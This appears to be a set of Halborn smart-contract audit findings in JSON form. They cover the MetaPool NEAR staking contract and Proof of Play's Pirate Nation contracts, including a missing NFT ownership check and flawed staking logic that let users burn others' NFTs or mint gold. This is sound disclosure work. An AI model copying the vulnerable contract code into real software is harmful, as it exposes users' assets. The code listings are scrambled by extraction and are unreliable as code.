\" } 15 16 near - sdk = { git = \" https :// github . com / near / near - sdk - rs . git \" , tag =  \" 3.1.0 \" } 17 near - contract - standards = { git = \" https :// github . com / near / near -  sdk - rs . git \" , tag = \" 3.1.0 \" } 18 19 20 # near - sdk = { git = \" https :// github . com / near / near - sdk - rs \" , tag = \"  3.0.1 \" } 21 # near - contract - standards = { git = \" https :// github . com / near / near -  sdk - rs . git \" , tag = \" 3.0.1 \" } 22 23 24 uint = { version = \" 0.8.3 \" , default - features = false } 25 26 [ dev - dependencies ] 26 27 lazy_static = \" 1.4.0 \" 28 quickcheck = \" 0.9 \" 29 quickcheck_macros = \" 0.9 \" 30 log = \" 0.4 \" 31 env_logger = { version = \" 0.7.1 \" , default - features = false } 32 33 rand = \" * \" 34 rand_pcg = \" *\" 35 36 # near - crypto = { git = \" https :// github . com / nearprotocol / nearcore .  git \" } 37 # near - primitives = { git = \" https :// github . com / nearprotocol /  nearcore . git \" } 38 39 near - sdk - sim = { git = \" https :// github . com / near / near - sdk - rs \" , tag =  \" 3.1.0 \" } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to update the dependencies to the latest available stable versions. Remediation Plan: ACKNOWLEDGED: The MetaPool team acknowledged this issue, and decided not to change the currently used version due to significant changes in the SDK API. 27 ", "labels": ["Halborn", "MetaPool_Liquid_Staking_NEAR", "Severity: Informational"]}, {"title": "REDUNDANT STATE VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the MetaPool contract implements a manual assertion in the new function that checks if the contracts state already ex- ists. However, the new function is also marked with #[init] macro which implements this behavior by default, making manual assertion redundant. Code Location: Listing 6: metapool/src/lib.rs (Line 289) 282 #[ init ] 283 pub fn new ( 284 285 286 287 288 ) -> Self { 289 owner_account_id : AccountId , treasury_account_id : AccountId , operator_account_id : AccountId , meta_token_account_id : AccountId , assert! ( !env :: state_exists () , \" The contract is already  initialized \" ); 290 291 292 293 294 295 296 297 298 let result = Self { owner_account_id , contract_busy : false , operator_account_id , treasury_account_id , contract_account_balance : 0 , web_app_url : Some ( String :: from ( DEFAULT_WEB_APP_URL )) , auditor_account_id : Some ( String :: from (  DEFAULT_AUDITOR_ACCOUNT_ID )) , 299 operator_rewards_fee_basis_points :  DEFAULT_OPERATOR_REWARDS_FEE_BASIS_POINTS , 300 operator_swap_cut_basis_points :  DEFAULT_OPERATOR_SWAP_CUT_BASIS_POINTS , treasury_swap_cut_basis_points :  DEFAULT_TREASURY_SWAP_CUT_BASIS_POINTS , staking_paused : false , 301 302 28 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 total_available : 0, total_for_staking : 0, total_actually_staked : 0, total_unstaked_and_waiting : 0 , retrieved_for_unstake_claims : 0, total_unstake_claims : 0, epoch_stake_orders : 0, epoch_unstake_orders : 0, epoch_last_clearing : 0, accumulated_staked_rewards : 0 , total_stake_shares : 0, total_meta : 0 , accounts : UnorderedMap :: new (b \"A \" . to_vec () ) , loan_requests : LookupMap :: new (b \" L\" . to_vec () ) , nslp_liquidity_target : 10 _000 * NEAR , nslp_max_discount_basis_points : 180 , // 1.8% nslp_min_discount_basis_points : 25 , min_deposit_amount : 10 * NEAR , // / for each stNEAR paid as discount , reward stNEAR sellers // 0.25%  with META . initial 5x , default :1 x . reward META = discounted *  mult_pct / 100 322 323 stnear_sell_meta_mult_pct : 50 , // 5 x // / for each stNEAR paid staking reward , reward stNEAR  holders with META . initial 10 x , default :5 x . reward META = rewards  * mult_pct / 100 324 325 staker_meta_mult_pct : 5000 , // 500 x // / for each stNEAR paid as discount , reward LPs with META .  initial 50 x , default :20 x . reward META = fee * mult_pct / 100 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 } lp_provider_meta_mult_pct : 200 , // 20 x staking_pools : Vec :: new () , meta_token_account_id , est_meta_rewards_stakers : 0 , est_meta_rewards_lu : 0, est_meta_rewards_lp : 0, max_meta_rewards_stakers : 1 _000_000 * ONE_NEAR , max_meta_rewards_lu : 50 _000 * ONE_NEAR , max_meta_rewards_lp : 100 _000 * ONE_NEAR , unstaked_for_rebalance : 0, unstake_for_rebalance_cap_bp : 100 , }; // all key accounts must be different result . assert_key_accounts_are_different () ; return result ; 29 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove the redundant code. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by removing the redundant code. 30 ", "labels": ["Halborn", "MetaPool_Liquid_Staking_NEAR", "Severity: Informational"]}, {"title": "FUNCTION CAN BE REPLACED BY MACRO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "was observed implements the It that prede- the if assert_callback_calling() cessor AccountId equals the current AccountId. Such functionality can also be achieved by using #[private] macro, which will reduce the codebase and make the code more readable. MetaPool that contract verifies the function Code Location: Listing 7: metapool/src/utils.rs assert_eq! ( env :: predecessor_account_id () , env :: 33 pub fn assert_callback_calling () { 34  current_account_id () ); 35 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to use the #[private] macro instead of manual assertions. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by using the #[private] macro over the assert_callback_calling function. 31 ", "labels": ["Halborn", "MetaPool_Liquid_Staking_NEAR", "Severity: Informational"]}, {"title": "DEAD CODE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that code inside validator_loans.rs file is mostly com- mented out, leaving one struct, which is used in the MetaPool contracts storage. However, it was observed that no logic is associated with that field, making it not necessary in the contract. Code Location: Listing 8: metapool/src/validator_loans.rs (Lines 3-6) // total requested pub amount_requested : u128 , 3 pub struct VLoanRequest { 4 5 6 } 7 8 /* 9 use crate ::*; 10 use near_sdk :: serde ::{ Deserialize , Serialize }; 11 12 pub use crate :: types ::*; 13 pub use crate :: utils ::*; 14 15 // - - - - - - - - - - - - - - - - - - - - - - - - 16 // 17 // - - - - - - - - - - - - - - - - - - - - - - - - 18 pub const DRAFT : u8 = 0; 19 pub const ACTIVE : u8 = 1; 20 pub const REJECTED : u8 = 2; 21 pub const APPROVED : u8 = 3; 22 pub const FEE_PAID : u8 = 4; 23 pub const EXECUTING : u8 = 5; 24 pub const COMPLETED : u8 = 6; 25 26 const ACTIVATION_FEE : u128 = 5 * NEAR ; 27 const MIN_REQUEST : u128 = 10 * K_NEAR ; 28 Validator Loan Req Status 32 29 (...) Listing 9: metapool/src/lib.rs 101 #[ near_bindgen ] 102 #[ derive ( BorshDeserialize , BorshSerialize , PanicOnDefault )] 103 pub struct MetaPool { 104 105 106 107 // validator loan request // action on audit suggestions , this field is not used . No (...)  need for this to be on the main contract pub loan_requests : LookupMap < AccountId , VLoanRequest >, (...) 108 109 110 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove the loan_requests field from the contracts storage and delete the validator_loans.rs file from the repository. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by removing the unnecessary files. 33 ", "labels": ["Halborn", "MetaPool_Liquid_Staking_NEAR", "Severity: Informational"]}, {"title": "POSSIBLE OPTIMIZATIONS TO REDUCE BINARY SIZE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Contract size directly corresponds to the costs associated with its operation, mainly - the deployment. Although many of the strategies aimed at reducing the compiled binary size achieve this goal at the expense of code readability, there are some measures that could be implemented without such sacrifices. It was observed that Cargo.toml file of MetaPool contract specified the crate-type as both cdylib and rlib, however usually only cdylib is necessary. Additionally, the release compilation profile used opt-level option set to s. Specifying the crate-type to only cdylib and changing the opt-level to z resulted in a wasm binary size reduction of 14%. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to change the crate-type parameter to cdylib and opt- level to z in Cargo.toml files to reduce the size of compiled binary. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by changing the crate-type parameter to contain only cdylib value and by setting the opt-level to a value of z. 34 ", "labels": ["Halborn", "MetaPool_Liquid_Staking_NEAR", "Severity: Informational"]}, {"title": "UNNECESSARY PROMISE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that MetaPool contract defines a set_reward_fee function that is responsible for setting operators rewards. This function is set as payable; however, it returns all the attached deposit, except 1 yocto NEAR. As such, it is not necessary to schedule that promise, and simply change the implementation to use assert_one_yocto function, which will reduce the code complexity and cost of executing that set_reward_fee function. Code Location: Listing 10: metapool/src/lib.rs (Lines 488-490) 479 #[ payable ] 480 pub fn set_reward_fee (& mut self , basis_points : u16 ) { 481 482 483 484 self . assert_owner_calling () ; assert! ( env :: attached_deposit () > 0) ; assert! ( basis_points < 1000) ; // less than 10% //  DEVELOPERS_REWARDS_FEE_BASIS_POINTS is included 485 486 self . operator_rewards_fee_basis_points = basis_points . saturating_sub (  DEVELOPERS_REWARDS_FEE_BASIS_POINTS ); 487 488 489 // return the deposit ( except 1 yocto ) if env :: attached_deposit () > 1 { Promise :: new ( env :: predecessor_account_id () ). transfer ( env ::  attached_deposit () ); 490 491 } } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) 35 Recommendation: It is recommended to remove balance transfer from the set_reward_fee function and introduce an assert_one_yocto function to make sure that the attached deposit is equal to exactly 1 yocto NEAR. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by sim- plifying the implementation to require one yocto of attached deposit. 36 ", "labels": ["Halborn", "MetaPool_Liquid_Staking_NEAR", "Severity: Informational"]}, {"title": "TYPO IN SIMULATION TESTING CAUSES FUZZ TESTS NOT TO EXECUTE PROPERLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The MetaPool contract uses a near-sdk-sim crate to simulate the contracts operation in the blockchain environment. In order to identify bugs, It was observed that they are not fuzz-based tests are implemented. always completely successful. It was identified that the root cause of Namely, the Action:: this behavior was a typo in the parameter name. LiquidUnstake branch improperly named the parameter stnear_to_burn. Code Location: Listing 11: metapool/tests/sim/simulation_fuzzy.rs (Line 131) println! (\" step_random_action {:?} {} \" , action , amount_near ); return match action { 72 pub fn step_random_action ( sim : & Simulation , 73 acc : & UserAccount , 74 action : Action , 75 amount_near : u64 , 76 77 pre : & State , 78 ) -> Result < StateAndDiff , String > { 79 80 81 82 83 84 85 86 87 88 89 90 91 & sim , & acc , \" deposit_and_stake \" , json! ({}) , 50 * TGAS , amount_near as u128 * NEAR , & pre , Action :: Stake => step_call ( ) , Action :: AddLiquidity => step_call ( 37 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 & sim , & acc , \" nslp_add_liquidity \" , json! ({}) , 200 * TGAS , amount_near as u128 * NEAR , & pre , ) , Action :: RemoveLiquidity => step_call ( & sim , & acc , \" nslp_remove_liquidity \" , json! ({ \" amount \" : ntoU128 ( amount_near ) }) , 200 * TGAS , NO_DEPOSIT , & pre , ) , Action :: DelayedUnstake => step_call ( & sim , & acc , \" unstake \" , json! ({ \" amount \" : ntoU128 ( amount_near ) }) , 100 * TGAS , NO_DEPOSIT , & pre , ) , Action :: DUWithdraw => step_call ( & sim , & acc , \" withdraw \" , json! ({ \" amount \" : ntoU128 ( amount_near ) }) , 50 * TGAS , NO_DEPOSIT , & pre , ) , Action :: LiquidUnstake => step_call ( & sim , & acc , \" liquid_unstake \" , json! ({ \" stnear_to_burn \" : ntoU128 ( amount_near ) , \"  min_expected_near \" : ntoU128 ( amount_near *95/100) }) , 132 133 134 50 * TGAS , NO_DEPOSIT , & pre , 38 135 136 137 ) , Action :: BotDistributes => bot_distributes (& sim , & pre ) , Action :: BotEndOfEpochClearing => bot_end_of_epoch_clearing  (& sim , & pre ) , 138 139 140 Action :: BotRetrieveFunds => bot_retrieve (& sim , & pre ) , Action :: BotPingRewards => bot_ping_rewards (& sim , & pre ) , Action :: StartRebalanceUnstake => bot_rebalance_unstake (&  sim , & pre ) , 141 Action :: ChangePoolsWeight => bot_change_pools_weight (& sim , Action :: LastAction => panic! ( \" invalid action \" ) ,  & pre ) , 142 143 144 } }; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to change the stnear_to_burn JSON key to the st_near_to_burn as defined in the liquid_unstake function. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit f11ba493 by cor- recting the typo. 39 THANK YOU FOR CHOOSING", "labels": ["Halborn", "MetaPool_Liquid_Staking_NEAR", "Severity: Informational"]}, {"title": "USERS CAN START A QUEST USING AS INPUT AND BURNING AN NFT THEY DO NOT OWN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the QuestSystem contract, the startQuest() function does not check that the NFT inputs are actually owned by the caller: Listing 1: QuestSystem.sol (Lines 371-389) 305 function startQuest ( QuestParams calldata params ) 306 307 308 309 310 { 311 external nonReentrant whenNotPaused returns ( uint256 ) QuestDefinition storage questDef = _questDefinitions [ params .  questId ]; 312 313 314 315 316 address account = _msgSender () ; // Verify user can start this quest and meets requirements require ( _isQuestAvailable ( account , params . questId , questDef ) ==  true , 317 318 319 320 321 \" QUEST_NOT_AVAILABLE : Sender cannot start this quest \" ); require ( params . inputs . length == questDef . inputs . length , \" INPUT_LENGTH_MISMATCH : Inputs to quest do not match to  quest definition \" 322 323 324 325 326 327 ); // Create active quest object _activeQuestCounter . increment () ; uint256 activeQuestId = _activeQuestCounter . current () ; 23 328 ActiveQuest storage activeQuest = _activeQuests [ activeQuestId  ]; 329 330 331 332 333 334 335 336 337 activeQuest . account = account ; activeQuest . questId = params . questId ; activeQuest . startTime = SafeCast . toUint32 ( block . timestamp ); activeQuest . status = ActiveQuestStatus . IN_PROGRESS ; // Track activeQuestId for this account _accountData [ account ]. activeQuestIds . add ( activeQuestId ); // Verify that the params have inputs that meet the quest  requirements 338 339 340 for ( uint8 idx = 0; idx < questDef . inputs . length ; idx ++) { QuestInput storage inputDef = questDef . inputs [ idx ]; GameRegistryLibrary . TokenPointer memory input = params .  inputs [ idx ]; 341 342 343 344 345 // Make sure token types match require ( input . tokenType == inputDef . tokenPointer . tokenType , \" TOKEN_TYPES_NOT_MATCHING : Token type is not matching  that expected by the quest \" 346 347 348 349 350 351 ); // Make sure proper token address was provided require ( inputDef . tokenPointer . tokenContract == address (0) || inputDef . tokenPointer . tokenContract == input .  tokenContract , 352 \" EXPECTED_SPECIFIC_TOKEN : Expected a specific token  address \" 353 354 355 356 357 358 359 360 ); GameRegistryLibrary . TokenType tokenType = inputDef . tokenPointer . tokenType ; uint32 reservationId = 0; // Check token type to ensure that the input matches what  the quest expects 361 362 363 if ( tokenType == GameRegistryLibrary . TokenType . ERC20 ) { require ( _hasAccessRole ( 24 364 GameRegistryLibrary .  GAME_CURRENCY_CONTRACT_ROLE , 365 366 367  \" 368 369 370 371 input . tokenContract ) == true , \" NOT_GAME_CURRENCY : Expected GameCurrency contract ); // TODO : Find a way to either lock or burn ERC20 stuff } else if ( tokenType == GameRegistryLibrary . TokenType .  ERC721 ) { 372 373 374 375 376 377 378 379 380 381  tokenId ); 382 383 384 385 386 387 388 389 390 // Auto - Lock NFT if necessary ILockingSystem lockingSystem = _lockingSystem () ; lockingSystem . isNFTLocked ( input . tokenContract , input . tokenId ) == false lockingSystem . lockNFT ( input . tokenContract , input . if ( ) { } reservationId = lockingSystem . addNFTReservation ( input . tokenContract , input . tokenId , true , GameRegistryLibrary . RESERVATION_QUEST_SYSTEM ); } else if ( tokenType == GameRegistryLibrary . TokenType .  ERC1155 ) { 391 392 393 394 395 396 397 398 399 400 401 402 reservationId = _lockingSystem () . addItemReservation ( account , input . tokenContract , input . tokenId , input . amount , true , GameRegistryLibrary . RESERVATION_QUEST_SYSTEM ); } // Perform all trait checks for ( 25 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 } uint8 traitIdx = 0; traitIdx < inputDef . traitChecks . length ; traitIdx ++ ) { TraitsLibrary . requireTraitCheck ( inputDef . traitChecks [ traitIdx ], ITraitsConsumer ( input . tokenContract ) , input . tokenId ); } activeQuest . inputs . push ( GameRegistryLibrary . ReservedToken ({ tokenType : input . tokenType , tokenId : input . tokenId , tokenContract : input . tokenContract , amount : input . amount , reservationId : reservationId }) ); } emit QuestStarted ( account , params . questId , activeQuestId ); return activeQuestId ; Moreover, when the quest inputs are unlocked upon quest completion in the _unlockQuestInputs() the NFT reservation is removed, but the NFT remains locked: Listing 2: QuestSystem.sol (Lines 718-726) 656 function _unlockQuestInputs ( address account , 657 QuestDefinition storage questDef , 658 ActiveQuest storage activeQuest , 659 bool isSuccess , 660 661 uint256 randomWord 662 ) internal { 663 664 665 uint32 successXp = isSuccess ? questDef . successXp : 0; // Unlock inputs , grant XP , and potentially burn inputs 26 666 667 668 669 670 671 672 673  / 674 675 676 677 678 679 680 681 682 683 684 685 686 687 688 689 690 691 692 693 694 695 696 for ( uint8 idx = 0; idx < questDef . inputs . length ; idx ++) { QuestInput storage input = questDef . inputs [ idx ]; GameRegistryLibrary . ReservedToken storage activeQuestInput = activeQuest . inputs [ idx ]; // Grant XP on success if ( successXp > 0 && input . xpEarnedPercent > 0) { uint32 xpAmount = ( successXp * input . xpEarnedPercent ) GameRegistryLibrary . PERCENTAGE_RANGE ; if ( xpAmount > 0) { ITraitsConsumer ( activeQuestInput . tokenContract ) . incrementTrait ( activeQuestInput . tokenId , TraitsLibrary . XP_TRAIT_ID , xpAmount ); } } // Determine if the input should be burned bool shouldBurn ; if ( input . consumable ) { uint256 burnRate = isSuccess ? input . successBurnRate : input . failureBurnRate ; if ( burnRate == 0) { shouldBurn = false ; } else if ( burnRate == GameRegistryLibrary .  PERCENTAGE_RANGE ) { 697 698 699 700 701 702 703 704 705 706 707 shouldBurn = true ; } else { randomWord = _nextRandomWord ( randomWord ); ( shouldBurn , randomWord ) = _weightedCoinFlip ( randomWord , burnRate ); } } // Unlock / burn based on token type 27 708 709 710 711 712 713  ( 714 715 716 717 718 719 720 721 722 723 724 725 726 727 728 729 730 731 732 733 734 735 736 737 738 739 740 741 742 743 744 745 746 747 } if ( ) { activeQuestInput . tokenType == GameRegistryLibrary . TokenType . ERC20 if ( shouldBurn ) { IGameCurrency ( activeQuestInput . tokenContract ). burn account , activeQuestInput . amount ); } } else if ( activeQuestInput . tokenType == GameRegistryLibrary . TokenType . ERC721 ) { _lockingSystem () . removeNFTReservation ( activeQuestInput . tokenContract , activeQuestInput . tokenId , activeQuestInput . reservationId ); } else if ( activeQuestInput . tokenType == GameRegistryLibrary . TokenType . ERC1155 ) { _lockingSystem () . removeItemReservation ( account , activeQuestInput . tokenContract , activeQuestInput . tokenId , activeQuestInput . reservationId ); if ( shouldBurn ) { IGameItems ( activeQuestInput . tokenContract ). burn ( account , SafeCast . toUint32 ( activeQuestInput . tokenId ) , activeQuestInput . amount ); } } } Based on this, initially a user would not be able to use the NFT of 28 another user as input as during the lockNFT() call the transaction would revert with the ORIGIN_NOT_NFT_OWNER error. Although, once the original owner has started and completed that quest with that NFT as input, the NFT would remain locked and as this NFT is already locked any user would be able now to start a quest using that NFT as the NFT ownership is not checked to create a reservation nor in the startQuest() function. This would create an exclusive reservation and while this quest is ongoing, the original owner would not be able to make use of that NFT. Moreover, if the issue described in ERC721 INPUTS ARE NEVER BURNT WHEN THE QUEST INPUTS ARE UNLOCKED was fixed, this NFT could be burnt during this process, leaving the original owner without his NFT. Basically, any user would be able to burn someone elses NFT using it as a quest input. 29 Proof of Concept: Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to: 1. Add a require statement that checks that the caller owns the NFT in the TokenType.ERC721 if code block, in the startQuest() function. 30 2. Also, unlocking the NFT before removing the NFT reservation in the _unlockQuestInputs() function. Remediation Plan: The Proof of Play team SOLVED: _verifyInputOwnership(input, account); function that validates that the inputs are owned by the caller. GameHelperLibrary. startQuest() the the in added call 31 ", "labels": ["Halborn", "ProofOfPlay_Pirate_Nation", "Severity: Critical"]}, {"title": "FLAWED LOGIC CAUSES THAT NAVIES WILL NEVER STEAL PIRATES GOLD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "As per the documentation, in the contract StakingSystem, when pirates unstake their items, there should be a 50% chance for all of their gold being stolen by the navies. This logic is implemented in the functions _claimGameNFTStakeRewards() and fulfillRandomWordsCallback(). In the _claimGameNFTStakeRewards() function, the variable balance is set initially to zero, but then it is never updated with the number of Pirate Ships staked which means that every VRFRequest.balance will be zero: Listing 3: StakingSystem.sol (Lines 677,703) address nftContract , uint256 nftTokenId , bool unstake 657 function _claimGameNFTStakeRewards ( 658 659 660 661 ) internal { 662 663 664 665 require ( address relevantAccount = tx . origin ; IGameNFT ( nftContract ). ownerOf ( nftTokenId ) ==  relevantAccount , 666 \" ORIGIN_NOT_OWNER_OF_NFT : Origin is not the owner of the  specified NFT \" );  nftTokenId ]; require ( 667 668 669 670 671 GameNFTStake storage nftStake = stakedNFTs [ nftContract ][ nftStake . reservationId != 0 , 32 672 673 674 675 676 677 678 679 680 681 682 683 \" NFT_NOT_STAKED : NFT has not been staked \" ); uint256 goldOwed = 0; uint256 xpOwed = 0; uint256 balance = 0; for ( uint256 i = 0; i < nftStake . gameItemStakes . length ; i ++) { ( uint256 goldFromShip , uint256 xpFromShip ) = _claimGameItemStakeRewards ( nftStake . gameItemStakes [ i],  unstake ); 684 685 686 687 688 689 690 691 692 693 694 695 696 697 698 goldOwed += goldFromShip ; xpOwed += xpFromShip ; } // Grant XP if ( xpOwed > 0) { ITraitsConsumer ( nftContract ). incrementTrait ( nftTokenId , TraitsLibrary . XP_TRAIT_ID , xpOwed ); } if ( unstake ) { // Figure out final amount of gold the player earns with  some randomness 699 700 701 702 703 704 705 706 707 708 709 710 711 712 713 uint256 requestId = _requestRandomWords (1) ; vrfRequests [ requestId ] = VRFRequest ({ account : relevantAccount , goldOwed : goldOwed , balance : balance , nftContract : nftContract , nftTokenId : nftTokenId }) ; // Release hold on NFT _lockingSystem () . removeNFTReservation ( nftContract , nftTokenId , nftStake . reservationId ); 33 714 715 716 717 718 719 // Delete the stake delete stakedNFTs [ nftContract ][ nftTokenId ]; // Emit unstaked event emit NFTUnstaked ( relevantAccount , nftContract , nftTokenId ,  requestId ); } else { 720 721 722 723 724 725 726 727 728 729 730 731 732 733 734 } // Mint gold rewards for user if ( goldOwed > 0) { goldToken . mint ( relevantAccount , goldOwed ); } emit NFTRewardsClaimed ( relevantAccount , nftContract , nftTokenId , unstake , goldOwed ); } This means that when the fulFillRandomWordsCallback() function is called by Chainlink VRF: 1. uint256 coinFlips = randomness % (2**request.balance); 2. (2**request.balance)= (2**0)= 1, (considering that request.balance will always be 0 here) 3. uint256 coinFlips = randomness % 1, (any number divided by 1 will always have as remainder 0) 4. coinFlips will always be 0 5. if coinFlips is 0, numStolen will never be increased and will always be 0, hence: Navies will never steal pirates gold when they are unstaked. Listing 4: StakingSystem.sol (Lines 814-829) 802 function fulfillRandomWordsCallback ( 803 804 uint256 requestId , uint256 [] memory randomWords 34 805 ) external override onlyRole ( GameRegistryLibrary . RANDOMIZER_ROLE )  { 806 807 808 809 810 811 812 VRFRequest storage request = vrfRequests [ requestId ]; address account = request . account ; if ( account != address (0) ) { uint256 randomness = randomWords [0]; // This should not overflow since the balance is  determined by gameplay logic 813 814 // and the user wont have more than 256 ships per stake uint256 coinFlips = randomness % (2** request . balance ); //  50% chance of stealing gold per ship staked 815 816 817 818 819 820 821 822 823 824 825 826 uint256 numStolen = 0; uint256 goldOwed = request . goldOwed ; while ( coinFlips > 0) { if ( coinFlips & 1 == 1) { numStolen ++; } coinFlips = coinFlips >> 1; } if ( numStolen > 0) { uint256 owedToNavy = numStolen * ( goldOwed / request .  balance ); 827 828 829 830 831 832 833 834 835 836 837 838 839 840 841 842 843 844 _payNavyTax ( owedToNavy ); goldOwed = goldOwed - owedToNavy ; } // Mint gold rewards for user if ( goldOwed > 0) { goldToken . mint ( account , goldOwed ); } // Emit event emit NFTRewardsClaimed ( account , request . nftContract , request . nftTokenId , true , goldOwed ); 35 delete vrfRequests [ requestId ]; 845 846 847 } } Proof of Concept: In the image below, 20 Pirate Ships are unstaked which are staked to Pirate ID 60 (command_rank of PirateId 60 = 4): Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to fix the logic in the _claimGameNFTStakeRewards() function and increase accordingly the balance local variable before doing the _requestRandomWords(1) call. Remediation Plan: SOLVED: The Proof of Play team fixed the issue and now correctly updates the balance local variable before making the _requestRandomWords(1) call: 36 Listing 5: StakingSystem.sol (Line 681) 671 uint256 balance = 0; 672 673 for ( uint256 i = 0; i < nftStake . gameItemStakes . length ; i ++) { 674 GameItemStake storage gameItemStake = nftStake . gameItemStakes [  i ]; 675 676 677 678 679 680 681 682 } ( uint256 goldFromShip , uint256 xpFromShip ) = _claimGameItemStakeRewards ( gameItemStake , unstake ); goldOwed += goldFromShip ; xpOwed += xpFromShip ; balance += gameItemStake . balance ; 37 ", "labels": ["Halborn", "ProofOfPlay_Pirate_Nation", "Severity: Critical"]}, {"title": "UNSAFE CAST CAN ALLOW USERS TO PERMANENTLY MINT GOLD TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract StakingSystem, the function claimNavyStakeRewards() is used to claim the Gold Tokens rewards for the Navy ships staked. This function calls the _claimGameItemStakeRewards() to calculate the goldOwed : Listing 6: StakingSystem.sol (Lines 448-451) address account , uint256 [] calldata stakeIndexes , bool unstake 426 function claimNavyStakeRewards ( 427 428 429 430 ) external whenNotPaused nonReentrant { 431 432 433 require ( tx . origin == account , \" USER_CALLER_ONLY : Only EOA can claim for their own  account \" 434 435 436 437 438 439 440 441 442 443 444 ); GameItemStake [] storage stakedItems = navyItemStakes [ account ]; uint256 goldOwed = 0; uint256 lastStakeIndex = stakedItems . length ; for ( uint256 idx = 0; idx < stakeIndexes . length ; idx ++) { uint256 stakeIndex = stakeIndexes [ idx ]; require ( stakeIndex < lastStakeIndex , \" STAKE_INDEX_MUST_DECREASE : StakeIndexes must be  sorted in descending order and be within bounds \" 445 446 447 ); // Claim rewards 38 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463  popping 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 } ( uint256 goldFromShip , ) = _claimGameItemStakeRewards ( stakedItems [ stakeIndex ], unstake ); goldOwed += goldFromShip ; // Emit event emit NavyRewardsClaimed ( account , stakedItems [ stakeIndex ]. tokenId , stakedItems [ stakeIndex ]. balance , unstake , goldOwed ); // If unstaking , remove from array by swapping to end and if ( unstake ) { if ( stakedItems . length > 1) { stakedItems [ stakeIndex ] = stakedItems [ stakedItems . length - 1 ]; } stakedItems . pop () ; } lastStakeIndex = stakeIndex ; } // Mint gold rewards for user if ( goldOwed > 0) { goldToken . mint ( account , goldOwed ); } The _claimGameItemStakeRewards() itself calls the _calculateGameItemStakeRewards () function and then, in the line 794, the stake.value is updated to totalTaxInGoldPerRank: Listing 7: StakingSystem.sol (Lines 750,794) 744 function _claimGameItemStakeRewards ( 745 GameItemStake storage stake , 39 ( goldOwed , xpOwed ) = _calculateGameItemStakeRewards ( stake ); bool pirateShip = GameHelperLibrary . _isPirateShip ( bool unstake address account = _msgSender () ; 746 747 ) internal returns ( uint256 goldOwed , uint256 xpOwed ) { 748 749 750 751 752 753 754 755 756 757 758 759 if ( pirateShip ) { require ( (( block . timestamp - stake . value ) >= gameItems , stake . tokenId ! unstake || );  MINIMUM_TO_EXIT ) , 760 \" STAKE_NOT_COMPLETE : Must be staked for minimum time  before unstaking \" 761 762 763 ); // If pirate is just collecting , there is a flat tax on  their earnings 764 765 if (! unstake ) { uint256 owedToNavy = ( goldOwed *  GOLD_CLAIM_TAX_PERCENTAGE ) / 766 767 768  owner 100; _payNavyTax ( owedToNavy ); // Pay tax to navy goldOwed = goldOwed - owedToNavy ; // Rest goes to 769 770 771 772 773 774 775 776 } } else { if ( unstake ) { uint8 rank = GameHelperLibrary . _rankForNavy ( gameItems , stake . tokenId ); totalNavyRankStaked -= rank ; // Remove rank from total  staked 777 778 779 780 781 782 783 } } if ( unstake ) { // Release reservation on items _lockingSystem () . removeItemReservation ( account , 40 784 785 786 787 788 789 790 address ( gameItems ) 